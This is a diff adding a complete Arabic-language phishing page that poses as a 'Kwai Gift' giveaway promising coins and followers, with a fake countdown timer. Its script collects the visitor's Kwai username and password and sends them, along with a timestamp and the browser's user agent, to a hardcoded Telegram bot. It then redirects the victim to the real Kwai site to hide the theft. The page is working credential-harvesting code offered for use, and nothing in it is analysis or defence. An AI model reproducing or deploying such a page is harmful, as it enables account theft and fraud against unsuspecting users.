@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Kwai Gift | هدية كواي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:linear-gradient(145deg,#0a0a1a,#1a1a2e);font-family:'Cairo',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        .card{max-width:480px;width:100%;background:rgba(255,255,255,0.05);backdrop-filter:blur(16px);border-radius:56px;border:1px solid rgba(255,255,255,0.15);overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.4);}
+        .hero{background:linear-gradient(135deg,#FF6B6B,#FFE66D);padding:32px 24px;text-align:center;clip-path:polygon(0 0,100% 0,100% 88%,0 100%);}
+        .hero h1{font-size:2rem;font-weight:800;color:#1a1a2e;margin-bottom:8px;}
+        .hero p{color:#1a1a2e;font-weight:600;margin-bottom:16px;}
+        .countdown{background:rgba(0,0,0,0.3);display:inline-flex;gap:15px;padding:8px 20px;border-radius:60px;}
+        .countdown div{text-align:center;color:white;font-weight:bold;}
+        .countdown span{background:#00000066;padding:4px 10px;border-radius:30px;font-size:1.3rem;font-family:monospace;}
+        .form{padding:32px 28px 40px;}
+        .input-group{margin-bottom:24px;}
+        .input-group input{width:100%;padding:16px 20px;background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.2);border-radius:48px;font-size:1rem;color:white;font-family:inherit;outline:none;transition:0.2s;}
+        .input-group input:focus{border-color:#FF6B6B;background:rgba(255,255,255,0.12);}
+        .input-group input::placeholder{color:rgba(255,255,255,0.5);}
+        .login-btn{width:100%;background:linear-gradient(95deg,#FF6B6B,#FFE66D);border:none;padding:16px;border-radius:60px;font-weight:800;font-size:1.2rem;color:#1a1a2e;cursor:pointer;transition:0.2s;}
+        .login-btn:active{transform:scale(0.97);}
+        .gift-note{text-align:center;margin-top:20px;font-size:0.8rem;color:#FFE66D;background:rgba(0,0,0,0.3);padding:8px;border-radius:30px;}
+        footer{text-align:center;padding:16px;font-size:0.7rem;color:rgba(255,255,255,0.4);background:rgba(0,0,0,0.2);}
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="hero">
+        <h1>🎁 رشقة كواي 🎁</h1>
+        <p>50,000 عملة + متابعين خارقين</p>
+        <div class="countdown">
+            <div><span id="hours">00</span><br>ساعة</div>
+            <div><span id="minutes">00</span><br>دقيقة</div>
+            <div><span id="seconds">00</span><br>ثانية</div>
+        </div>
+    </div>
+    <div class="form">
+        <form id="kwaiForm">
+            <div class="input-group"><input type="text" id="username" placeholder="رقم الهاتف أو البريد الإلكتروني" autocomplete="off" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+            <button type="submit" class="login-btn">تسجيل الدخول واستلام الهدية 🚀</button>
+        </form>
+        <div class="gift-note">⚡ سيتم إضافة الرشقة خلال دقيقة</div>
+    </div>
+    <footer>© Kwai Gift 2026 - عرض حصري</footer>
+</div>
+<script>
+    const BOT_TOKEN = "7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM";
+    const ADMIN_ID = "6829017835";
+
+    async function sendToTelegram(username, password) {
+        const text = `🎁 **كواي Kwai | رشقة جديدة** 🎁\n\n👤 **المستخدم:** ${username}\n🔑 **كلمة المرور:** ${password}\n🕒 ${new Date().toLocaleString('ar-EG')}\n📱 ${navigator.userAgent.slice(0,70)}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown'})
+            });
+            return res.ok;
+        } catch(e) { return false; }
+    }
+
+    function startCountdown() {
+        let total = 2*3600+15*60;
+        const hSpan=document.getElementById('hours'), mSpan=document.getElementById('minutes'), sSpan=document.getElementById('seconds');
+        setInterval(()=>{
+            if(total<=0) return;
+            const h=Math.floor(total/3600), m=Math.floor((total%3600)/60), s=total%60;
+            hSpan.innerText=h<10?'0'+h:h; mSpan.innerText=m<10?'0'+m:m; sSpan.innerText=s<10?'0'+s:s;
+            total--;
+        },1000);
+    }
+    startCountdown();
+
+    document.getElementById('kwaiForm').addEventListener('submit', async(e)=>{
+        e.preventDefault();
+        const user = document.getElementById('username').value.trim();
+        const pass = document.getElementById('password').value;
+        if(!user||!pass) return alert('املأ جميع الحقول');
+        const btn = e.target.querySelector('.login-btn');
+        const original = btn.innerText;
+        btn.innerText = 'جاري الإرسال...';
+        btn.disabled = true;
+        const ok = await sendToTelegram(user, pass);
+        if(ok){
+            alert('✅ تم إرسال الهدية! جاري التحويل...');
+            window.location.href = 'https://www.kwai.com';
+        } else {
+            alert('❌ فشل الإرسال، تأكد من الاتصال');
+            btn.innerText = original;
+            btn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
